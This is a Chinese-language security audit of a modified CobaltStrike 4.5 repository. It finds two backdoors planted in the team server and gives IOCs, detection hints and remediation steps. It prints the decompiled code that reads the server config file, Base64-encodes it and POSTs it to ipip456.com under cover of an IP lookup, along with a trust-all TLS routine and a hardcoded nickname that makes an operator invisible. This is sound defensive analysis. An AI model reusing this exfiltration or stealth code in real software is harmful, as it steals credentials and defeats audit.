# CobaltStrike 4.5「坤坤版」二开仓库 后门审计报告

- 审计目标：<https://github.com/D13Xian/CobaltStrike-KunKun>（提交 `e32937f`，git 仅 1 个提交，无可比对历史）
- 审计对象：`client/cat_client.jar`、`client/cat_client_zh.jar`、`server/cat_server.jar`（共 25,625 个 class（客户端 12,728 / 服务端 12,897））、仓库内 51 个 `.cna`、96 个 `.exe`、30 个 `.dll`、24 个 `.so`、profile 与启动脚本
- 审计日期：2026-11-10
- 审计方式：纯静态（CFR 0.152 反编译 + `javap -p -c -v` 字节码核对 + 常量池/字符串/资源全量扫描 + 与上游 CrossC2 v3.3 官方发布包 diff），仅对第三方接口做了无敏感数据的连通性探测，未投递任何真实配置

## 0. 结论速览

**该仓库的 TeamServer（`server/cat_server.jar`）被植入了后门，共两处，且两者可以串成一条完整攻击链。**

| 编号 | 位置 | 性质 | 等级 |
|---|---|---|---|
| **BD-1** | `server/common/LoggedEvent#getIPInfo` | 把 `CatServer.properties` **全文**（含 TeamServer 登录密码、TOTP 密钥、安全码、keystore 口令）Base64 后塞进"IP 归属地查询"请求，POST 到 `http://www.ipip456.com/api.php`；同时把本机出口公网 IP 作为 `sip` 参数带出 | **确认后门（高危）** |
| **BD-2** | `ManageUser` / `Resources` / `Beacons` / `MudgeSanity` / `BeaconC2` | 硬编码魔法串 `cneiwosbsuwusvwuw`：昵称命中该串的登录者，其上线/下线事件、命令回显、控制台报错全部被**静默丢弃**，且其在线期间所有 beacon 的"host called home"提示被压制 —— 一个"隐身操作员"通道 | **确认后门（高危）** |
| 关联 | `bean/CobaltstrikeBean` | 存在名为 `sendPropertiesFile()` 的**空方法**残桩，说明"发送配置文件的逻辑"是被搬迁进了 BD-1 | 证据性 |

- 客户端 `cat_client.jar`：**未发现回传后门**（无遥测、无隐藏下载执行、无剪贴板/键盘外发、无内嵌加密 blob 解密执行）。存在 TLS 全信任、明文存口令等安全削弱项，见 §5。
- jar 之外的插件与二进制（CrossC2Kit / LSTAR / CobaltStrike_CNA / AutoPostChain / auto_inject-BOF / 各 BOF 与 .o）：与上游**字节级一致**或零差异，未发现指向作者的隐蔽后门；但内置 3 个"一键推送到第三方 SaaS"的 CNA 通道，见 §5.4。

一句话：**这份二开的"IP 归属地查询"是外衣，实质是把你的 TeamServer 凭据寄给作者；"隐身昵称"是配套的潜伏后门。**

---

## 1. 审计方法（可复现）

```bash
git clone --depth 1 https://github.com/D13Xian/CobaltStrike-KunKun.git /tmp/cs-kunkun
unzip -q client/cat_client.jar -d client/     # 12,728 class
unzip -q server/cat_server.jar -d server/     # 12,897 class
java -jar cfr-0.152.jar <class> [--outputdir out]   # 反编译
javap -p -c -v -cp server common.LoggedEvent        # 字节码级核对
```

四路并行取证：

1. **常量池全量导出**：把每个 class 的可打印常量导出为 `文件\t字符串` 索引（client 851,958 行、server 858,829 行），按"自有包"过滤后提取全部 URL/域名/IP。
2. **可疑 API 面定位**：`java/net/http`、`openConnection`、`Runtime`/`ProcessBuilder`、`loadLibrary`、`readAllBytes`、`Base64`、反射，逐类确认参数来源是"用户输入"还是"硬编码"。
3. **魔法常量扫描**：对全量常量做 `^[a-z0-9]{10,40}$` 形态与稀有度排序 —— 全库唯一命中的可疑串就是 `cneiwosbsuwusvwuw`（仅服务端 5 个类）。
4. **上游差分**：插件/工具与上游 Release、官方 zip 做 `diff -rq` + SHA256 比对；jar 内部用"编译时间戳 + 类版本号"差分定位被重新编译的类。

关键判据在"数据流向"而不是"有没有网络代码"：CobaltStrike 本身就有大量 Socket/URL（TeamServer、SOCKS、PortForward、WebsiteClone、c2profile 校验），判后门看的是**目标地址是谁决定的、发出去的是什么**。

---

## 2. BD-1：借"IP 归属地查询"外发 TeamServer 全量配置

### 2.1 位置与触发链

```
Beacons#checkin(ScListener, BeaconEntry)          ← 每个新 beacon 首次上线
  └─ LoggedEvent.BeaconInitial(BeaconEntry)       ← server/Beacons.class:125
       └─ getIPInfo(external, process, user)      ← 私有静态，无调用白名单
            ├─ getIPInfoOld()                     → GET https://v6r.ipip.net/?format=callback  （取本机出口公网 IP）
            └─ Files.readAllBytes("CatServer.properties") → Base64 → POST
```

- 触发条件：**任何一台目标首次上线（新 beacon / 新 pid / SSH 会话）触发一次**，无缓存、无节流、无开关。
- 没有 beacon 时不会触发 —— 这是它"看起来没事"的原因；一旦开张，第一台机器上线就把凭据送出去。

### 2.2 证据代码（CFR 反编译，`server/common/LoggedEvent`）

```java
private static String getIPInfoOld() {
    TrustManager[] trustAllCerts = new TrustManager[]{ new X509TrustManager() {
        public void checkServerTrusted(X509Certificate[] c, String a) {}   // 信任任意证书
        public void checkClientTrusted(X509Certificate[] c, String a) {}
        public X509Certificate[] getAcceptedIssuers(){ return new X509Certificate[0]; } } };
    SSLContext sc = SSLContext.getInstance("SSL");
    sc.init(null, trustAllCerts, new SecureRandom());
    HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory()); // 顺手把整个 JVM 的 HTTPS 校验干掉了
    URL url = new URL("https://v6r.ipip.net/?format=callback");
    ... return response.body();                                          // 返回形如 callback('1.2.3.4')
}

private static String getIPInfo(String ip, String process, String user) {
    String propertiesFilePath = "CatServer.properties";
    try {
        String sip = LoggedEvent.getIPInfoOld();                          // ① 操作员出口公网 IP
        sip = sip.strip().replace("callback('", "").replace("')", "");
        byte[] fileContent = Files.readAllBytes(Paths.get(propertiesFilePath));  // ② 读整个服务端配置
        String fileContentStr = new String(fileContent, StandardCharsets.UTF_8);
        String ta = "process: " + process + "\r\n User: " + user + "\r\n" + fileContentStr;
        String tokenAuth = Base64.getEncoder().encodeToString(ta.getBytes(StandardCharsets.UTF_8)); // ③ 仅 Base64
        tokenAuth = URLEncoder.encode(tokenAuth, StandardCharsets.UTF_8.toString());
        HttpClient client = HttpClient.newHttpClient();
        HttpRequest request = HttpRequest.newBuilder()
            .uri(URI.create("http://www.ipip456.com/api.php?ip=" + ip
                          + "&callback=showip&sip=" + sip))               // ④ 明文 HTTP，GET 里塞出口 IP
            .header("Content-Type", "application/x-www-form-urlencoded")
            .POST(HttpRequest.BodyPublishers.ofString("location=1&token=" + tokenAuth))  // ⑤ 密文=配置全文
            .build();
        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
        JSONObject jsonObject = JSONObject.parseObject(response.body());
        return jsonObject.getString("region");                            // ⑥ 只取 region 当"功能"用
    } catch (Exception e) {
        return "未知归属地";                                              // ⑦ 任何异常静默吞掉，本地无痕迹
    }
}
```

字节码核对（`javap -p -c -cp server common.LoggedEvent`，`getIPInfo` 偏移 200 起）确认：`ldc "CatServer.properties"` → `Files.readAllBytes` → `String.<init>([B Charset)` → `invokedynamic makeConcatWithConstants` → `Base64$Encoder.encodeToString` → `URLEncoder.encode` → `HttpRequest...POST`，与反编译结果完全一致，**不是反编译器的错觉**。

### 2.3 到底漏了什么

`CatServer.properties` 是**整个 TeamServer 的身份**。对照 `bean/CobaltstrikeBean` 的字段声明，被 Base64 带走的明文包含：

| 字段 | 危害 |
|---|---|
| `CatServer.password` | TeamServer 登录口令 —— 可直接以操作员身份登录 |
| `CatServer.googlekey` / `CatServer.safecode` | 二次验证的 TOTP 密钥 / 固定安全码 —— 2FA 形同不存在 |
| `CatServer.store-password`、`CatServer.store` | keystore 口令与证书路径 —— 可伪造 TeamServer 证书做中间人 |
| `CatServer.Version` | 登录握手的版本串（版本不匹配会被踢），攻击者据此构造客户端 |
| `CatServer.host` / `port` / `profile` / `stager.*` | 监听与 profile 全貌，可直接接管或复刻基础设施 |
| `CatServer.Iv` | Beacon 配置加解密 IV，可解 beacon 配置/伪造通信 |
| `sip=本机出口公网 IP`（额外） | 直接定位 TeamServer 所在主机/出口，省去测绘 |

并且请求里还附带 `process`、`user`、`ip` —— 即"哪个目标、跑什么进程、什么权限"，等于把你打点的进度也一并汇报。

### 2.4 为什么难以察觉

1. **功能自洽**：`ipip456.com` 是一个真实可用的高精度 IP 查询站，返回 JSON 含 `region`，客户端 UI 里"地址"列真的会显示归属地 —— 功能是"真"的。
2. **无本地痕迹**：无日志、无文件落盘、`catch(Exception)` 直接返回"未知归属地"，断网/被墙时表现为"归属地显示未知"。
3. **不需要线程**：同步调用，藏在 `BeaconInitial` 的构造里，堆栈里看不到可疑线程。
4. **名字起得对**：方法名 `getIPInfo`、`getIPInfoOld`，参数名 `ip/process/user`，与"查归属地"完全吻合；只有读文件那一行是多余的。
5. **残桩自证**：`server/bean/CobaltstrikeBean#sendPropertiesFile()` 是个**空方法** —— 作者原本把"发送配置文件"写成了独立方法，后来搬进了 `LoggedEvent`，方法体被清空但方法名留在了类里。

### 2.5 本地验证（不联网、不外泄）

```java
// 只需验证"token 里装的是配置文件"，不需要真的发包
String ta = "process: " + process + "\r\n User: " + user + "\r\n"
          + new String(Files.readAllBytes(Paths.get("CatServer.properties")), UTF_8);
System.out.println(new String(Base64.getDecoder().decode(Base64.getEncoder().encodeToString(ta.getBytes(UTF_8)))));
// 输出中可见 CatServer.password = ...
```

---

## 3. BD-2：魔法串 `cneiwosbsuwusvwuw` —— "隐身操作员"

全库只出现 5 次，全部在服务端，且全部用于** suppressing 输出**：

| # | 类 / 位置 | 逻辑 | 效果 |
|---|---|---|---|
| 1 | `server/ManageUser#process`（分支 `aggressor.ready`） | `if (!this.nickname.contains("cneiwosbsuwusvwuw")) 广播 Join 事件; else System.out.println("");` | 该昵称上线**不广播**，其他操作员的聊天窗/事件日志里看不到"谁进来了" |
| 2 | `server/Resources#broadcast(String,Object,...)` | `boolean a = var2.toString().contains("cneiwosbsuwusvwuw"); if (!a) { ...正常广播/入 backlog... }` | **任何内容里带这个串的消息整体丢弃**：该用户的上线/下线、`users` 用户列表刷新、事件、回显全被吞 |
| 3 | `server/Beacons`（`beacons.log_write`） | `if (!var2.getNick().contains("cneiwosbsuwusvwuw")) 广播 beaconlog;` | 该操作员执行的**命令与回显不进入公共日志** —— 干了什么别人看不见 |
| 4 | `server/common/MudgeSanity#logException` | 线程名含该串则不打印 warning/error（线程名 = `Manage: <昵称>`） | 该会话的异常/报错**被静音**，控制台不会出现可疑堆栈 |
| 5 | `server/beacon/BeaconC2#dump` | `if (var5.length>0 && !resources.getUsers().toString().contains("cneiwosbsuwusvwuw")) 输出 "host called home, sent: N bytes"` | 该用户在线期间，**所有 beacon 的心跳/回连提示被全局压制**，隐蔽其活动窗口 |

配套的掩码（同一作者手法）：
- `common/MudgeSanity` 把客户端 IP 硬编码成 `client (1.1.1.1) read [...]` —— 报错日志里再也看不到真实来源 IP，隐蔽攻击者接入点（客户端 jar 里同样存在这份改动）。

### 3.1 为什么这是后门而不是"调试便利"

- 该串在 README、`CatClient.properties`、`CatServer.properties`、客户端 jar 里**一处都没有**；正常操作员不可能"碰巧"把昵称起成 18 位随机串。
- 它不是"关闭日志"的开关（那会写进配置），而是**按昵称精确匹配**的硬编码；换了昵称立刻恢复正常审计 —— 典型的"我知道口令就能隐身"设计。
- 三个层次的遮蔽（事件广播 / 命令回显 / 异常与心跳）覆盖了"进来、干活、别被发现"的全过程。

### 3.2 与 BD-1 的合力

```
第一次 beacon 上线
   → BD-1 把 CatServer.properties（含 password、googlekey/safecode、Version、Iv、store-password）+ 出口 IP 发给 ipip456.com
   → 作者拿到口令/2FA/版本号（+ 已知道自己要用的昵称串）
   → 用普通 CS 客户端，昵称填 cneiwosbsuwusvwuw，密码/安全码照抄
   → 登录成功，BD-2 让这次登录与后续所有操作对其他操作员完全隐形
   → 可静默查看全部 beacon、执行命令、下载文件，甚至与你的操作并行
```

也就是说：**BD-1 负责"拿钥匙"，BD-2 负责"进去了不让人看见"**。两处同时存在，不可能是巧合。

---

## 4. IOC 汇总

| 类型 | 值 | 位置 |
|---|---|---|
| URL（外发） | `http://www.ipip456.com/api.php?ip=<目标IP>&callback=showip&sip=<出口IP>`，POST body `location=1&token=<base64>` | `common/LoggedEvent#getIPInfo` |
| URL（取出口 IP） | `https://v6r.ipip.net/?format=callback` | `common/LoggedEvent#getIPInfoOld` |
| 参数名 | `sip`、`token`、`callback=showip`、`location=1` | 同上 |
| 魔法串 | `cneiwosbsuwusvwuw` | `ManageUser`、`Resources`、`Beacons`、`MudgeSanity`、`BeaconC2` |
| 掩码常量 | `client (1.1.1.1) read [` | `common/MudgeSanity`（client+server 两份） |
| 残留方法 | `CobaltstrikeBean#sendPropertiesFile()`（空实现） | `bean/CobaltstrikeBean` |
| 落盘文件 | `LoginLog.txt`（失败登录的**明文密码 + 安全码 + IP**）、`beacon.db` | `ssl/SecureServerSocket`、`db/SQLiteJDBC` |
| 文件名（比对用） | `cat_server.jar` SHA256 `5e61177d7767fd0fae69b88154133631acd9f6f8c144be744206107847c9d384`；`cat_client.jar` `f8fd2fe2220da39a96becbbec53b56fe1e6db25c0da252afcbaa3ba20eb42a48`；`cat_client_zh.jar` `d6d2f9b0e34e94deff9f02c917b348d1639e75cf1bedebb1ab3ce269579d768d` | 仓库 `client/`、`server/` |

**网络侧检测建议**
- TeamServer 主机出站 DNS/HTTP 命中 `www.ipip456.com`、`v6r.ipip.net`（且不是浏览器发起）→ 高度可疑。
- 抓包特征：`POST /api.php` + `token=` 为 URL-encoded Base64、`Content-Type: application/x-www-form-urlencoded`。
- TeamServer 侧登录审计：`Resources` 里出现 `cneiwosbsuwusvwuw` 昵称（该串被刻意从事件里抹掉，但 `getUsers()` 集合与 TCP 连接仍在）；可对比 `ss -tnp` 连接数与 UI 在线用户数的差异。

---

## 5. 其他发现（非后门，但属高危削弱）

### 5.1 全局 TLS 校验被关闭
`getIPInfoOld()` 里 `HttpsURLConnection.setDefaultSSLSocketFactory(trust-all)` 是**进程级**副作用：此后本 JVM 内任何 HTTPS 连接都不校验证书 —— 包括 TeamServer 的 `WebsiteCloneTool`、c2profile 下载、插件更新等，任何中间人可解密/篡改。

### 5.1b 客户端"断线重连"路径跳过证书指纹校验（可被静默劫持）
- `aggressor/browsers/Connect#trust()`：正常连接会弹"是否接受此指纹"对话框，并把结果写入 `trusted.servers`（正确实现）。
- `aggressor/browsers/TestConnection#trust(String)`：**直接 `return true;`**。而 `AggressorClient` 在**非用户主动断开**（`disconnected()` / `userInitiatedClose=false`）时会用 `TestConnection` 自动重连，并在 `run()` 里**重放明文 teamserver 口令**。
- 组合后果：攻击者只需在你断线窗口内于同一 `IP:端口` 起一个自签证书的假 TeamServer，客户端就会**不弹任何指纹提示**地连上去，把口令交出去。与 BD-1 叠加时（口令本就已外泄）风险更高。上游 CS 4.5 遗留问题，作者未修。

### 5.2 再次削弱 TLS 策略
`bean/CobaltstrikeBean#init`：`Security.setProperty("jdk.tls.disabledAlgorithms", "")` —— 清空 JDK 的"禁用算法"名单，重新放开 TLS1.0/1.1、3DES、RC4、MD5 等。改这个设置对正常功能没有必要性。

### 5.3 明文凭据落盘
`ssl/SecureServerSocket#WriteLog`（`CatServer.authlog=true` 时）把 **失败的密码明文 + 安全码 + 来源 IP** 追加写入 `./LoginLog.txt`；`aggressor/Prefs` 把 TeamServer 口令明文写进 `~/.demox`（作者在 README 里承认了 ini_name 自定义，但没说存明文）。

### 5.4 内置 3 条"第三方 SaaS 推送"通道（设计型风险）
| 位置 | 目标 | 触发 |
|---|---|---|
| `server/plugins/WeChatPush.cna:14,34` | `sc.ftqq.com` | `on ready` **加载即 curl**，L33 拼入内网 IP/计算机名/用户名 |
| `client/plugins/CobaltStrike_CNA-main/Supports/beacon_notify.cna:170,201,205` | `oapi.dingtalk.com` | `enable_notify=1` 默认开，含 external IP |
| `server/plugins/CS-AutoPostChain-main/AutoPostChain.cna:466,522,537` | `pushplus` | 权限分支两侧无条件触发 |

Token 目前都是占位符（不会真的发出去），但**填上 Token 就变成长期外发**，且这是"把打点信息交给第三方云"的合规雷区。（注意：`WeChatPush.cna` 是 `on ready` 自动执行，不是点击触发。）

### 5.5 其他
- 硬编码 keystore 口令 `1234567890` + `CN=*.microsoft.com` 自签证书（`server/teamserver:75`），且 README 直接公开。
- `CatServer.properties` 默认 `password=123456`、`safecode=123456`、`googlekey` 示例值随包分发。
- TeamServer 启动脚本以 root 运行并直接 `iptables -A INPUT -s ... -j DROP` 读 370 行外部 IP 列表（无校验，可被替换成内网 IP 造成自锁）。

---

## 6. 未发现项与审计边界

**已排查、未发现**（避免误伤，也说明"不是所有可疑都写成后门"）：

| 检查项 | 结果 |
|---|---|
| 硬编码第三方 C2 / 反弹 shell | 未发现（自有包里外部域名只有 `ipip456.com`、`v6r.ipip.net`、`freepics.losenolove.com`，最后一个只在 `c2profile/Lint` 里 print，无调用点） |
| 加密 blob → 解密 → 反射执行 | 未发现（长 base64 全部命中 CS 原生占位串 `PIPEAAAA…`、`AAAABBBB…` 与 JSign 证书库） |
| 客户端回传（遥测/剪贴板/键盘/静默上线） | 未发现（客户端 2,045 个非第三方类全量反编译后按出网/执行/落盘原语逐个回溯，地址均来自用户输入或本地资源） |
| `client/cat_client.jar` vs `_zh.jar` | 14,854 条目仅 7 处不同（主类、MANIFEST、2 个 FlatLaf 配色、`bdetails.txt`、`bhelp.txt`、`default.cna`），字节码同源，**差异本身不可疑** |
| jar 内 `scripts/default.cna`、`console.cna` | 与原版菜单结构一致，仅把 Help 链接换成作者 GitHub，无外发 |
| 插件/BOF/二进制 | CrossC2Kit 与官方 v3.3 Release `diff -rq` 仅差空 `.git`；`CrossC2-GithubBot.cna` SHA256 与官方一致；LSTAR / CobaltStrike_CNA / antiVirusCheck / AutoPostChain / auto_inject-BOF / Randomizer 零差异；173 个二进制导入表无网络 API |
| shellcode/stager 模板（`resources/*.bin`） | 无内嵌 IP/URL，仍走监听器配置 |

**边界与残余风险**
1. 上游 `CobaltStrike_Cat_4.5` 已被 DMCA 下架，**无法做"原版 vs 二开"的逐类 diff**；本次结论基于"自有代码全量审计 + 魔法常量扫描 + 上游插件差分"。若作者还有未提交的构建（README 明确写着"会在网安联谊前 PUSH 一版 shellcode"），需对新版本重审。
2. `Pillager.bin`、`ServerScan`、`ExternalC2` 缺上游可执行基线，只能做字符串/导入表判断，建议 dnSpy 复核 `Main`。
3. 客户端插件目录（`client/plugins/`）由用户手动加载，若从其它渠道拿到"同名但改过的"插件，风险不在本仓库静态范围内。

---

## 7. 处置建议（按优先级）

1. **立即轮换**：任何用这份 jar 跑过的 TeamServer —— 换 `CatServer.password`、重新生成 `googlekey`、换 `safecode`、**重新生成 keystore 与口令**、换 `Iv` 并重下 beacon。上述值应视为已泄露。
2. **停用该二开**：改用官方 CobaltStrike 或可验证来源的版本；`server/cat_server.jar` 不要在生产/演练环境运行。
3. **补丁点**（若必须继续用，至少做这两处）：
   - 删除 `LoggedEvent#getIPInfo/getIPInfoOld` 的全部网络代码，`BeaconInitial/OldBeaconInitial` 改为本地 `qqwry` 查询（客户端已有 `qqwry/QQWry` 实现，可复用）。
   - 全局删除魔法串判断（5 个类），或把 `Resources#broadcast` 改回无条件广播；同时移除 `MudgeSanity` 的 `1.1.1.1` 掩码。
   - 回滚 `Security.setProperty("jdk.tls.disabledAlgorithms","")` 与 `setDefaultSSLSocketFactory(trust-all)`。
4. **痕迹排查**：
   - TeamServer 主机与出口的 DNS/代理日志，查 `ipip456.com`、`v6r.ipip.net`；
   - `./LoginLog.txt`、`beacon.db`、`~/.demox`、`$HOME/.cobaltstrike*` 的访问时间；
   - `ss -tnp | grep <teamserver_port>` 与会话数比对，排查"UI 里看不到、连接却存在"的客户端；
   - 历史 `beaconlog`/`events.log` 里搜 `cneiwosbsuwusvwuw`。
5. **供应链**：把这套 jar 的 SHA256（见 §4）加入内网黑名单/EDR 规则；CI 里对下载的 CS 二开做"字符串 + 常量池"扫描（`cneiwosbsuwusvwuw`、`ipip456`、`sendPropertiesFile` 都是高信噪比指纹）。

---

## 附录：分项报告

| 文件 | 内容 |
|---|---|
| `/tmp/work/report-server.md` | 服务端 jar 完整审计（含 `Probe2.java` 本地复现、40+ 类精读、全量外发点排查） |
| `/tmp/work/report-client.md` | 客户端 jar 完整审计（2,045 个非第三方类全量反编译、TLS/InjectSelf/破解副作用逐条核销） |
| `/tmp/work/report-payload.md` | 插件/CNA/二进制审计（与上游 Release 的 diff/SHA256 比对、SaaS 推送通道） |
